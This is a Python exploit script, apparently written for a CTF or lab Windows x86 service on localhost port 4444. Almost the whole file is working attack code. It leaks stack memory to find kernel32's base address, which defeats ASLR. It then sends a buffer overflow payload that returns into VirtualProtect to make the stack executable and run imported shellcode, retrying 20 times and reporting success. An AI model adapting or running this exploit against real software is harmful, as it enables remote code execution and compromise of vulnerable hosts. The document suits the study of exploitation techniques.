from util import *
from environment import *
from functools import reduce

s = Socket("127.0.0.1", 4444)

N = 20
OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 = 0x7C
OFFSET_CONTENT_TO_SAVED_EBP = 0x24
OFFSET_CONTENT_TO_RET = OFFSET_CONTENT_TO_SAVED_EBP + 4
OFFSET_EBP_TO_CONTENT = 0x30

CONTENT_LEN = 200


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}\r\n".encode("utf-8"))


def get_content():
    send_n(1)

    d = cmd().split(b"\r")[0].split(b" ")
    d.pop()
    d = reduce(lambda a, x: a + int(x, 16).to_bytes(1, "little"), d, b"")
    return d


def exit_func():
    send_n(8)  # invalid number


def set_content_len(l: int):
    send_n(2)
    s.recvuntil(b"content length: ")
    send_n(16)
    s.recvuntil(b"content: ")
    s.send((b"A" * 12) + le32(l) + b"\r\n")


def write_mem(data: bytes):
    send_n(2)
    s.recvuntil(b"content: ")
    s.send(data + b"\r\n")


def main() -> bool:
    s.connect()
    cmd()
    set_content_len(CONTENT_LEN)  # must be big than payload size
    cmd()
    data = get_content()

    kernel32_address = None
    offset = None

    for off in [0, 4, 8, 12]:
        kernel32_BaseThreadInitThunk_address = (
            to_u32(data, OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 + off) - 0x19
        )
        addr = kernel32_BaseThreadInitThunk_address - X86_OFFSET_BaseThreadInitThunk

        if addr & 0xFFFF == 0:
            kernel32_address = addr
            offset = off
            break

    if kernel32_address == None or offset == None:
        print("No valid address")
        return False

    kernel32_VirtualProtectStub_address = (
        kernel32_address + X86_OFFSET_VirtualProtectStub
    )

    saved_ebp = to_u32(data, OFFSET_CONTENT_TO_SAVED_EBP + offset)
    content_address = saved_ebp - OFFSET_EBP_TO_CONTENT + offset

    print(f"offset: {offset}")
    print(f"saved ebp: 0x{saved_ebp:x}")
    print(f"content.content: 0x{content_address:x}")
    print(f"kernel32!VirtualProtectStub: 0x{kernel32_VirtualProtectStub_address:x}")

    # pwn
    padding_size = OFFSET_CONTENT_TO_RET + offset
    shell_code_address = content_address + padding_size + 4 * 6

    payload = b""
    payload += b"A" * padding_size
    payload += le32(kernel32_VirtualProtectStub_address)
    payload += le32(shell_code_address)
    payload += le32(shell_code_address)
    payload += le32(len(X86_SHELL_CODE))
    payload += le32(0x40)
    payload += le32(content_address)
    payload += X86_SHELL_CODE
    print(f"payload: {payload}")

    write_mem(payload)
    print("payload write")
    input("Press Enter to continue...")

    cmd()
    exit_func()

    s.kill()
    return True


if __name__ == "__main__":
    results = []
    for _ in range(N):
        results.append(main())

    print(f"{sum(1 for x in results if x)}/{N} OK")
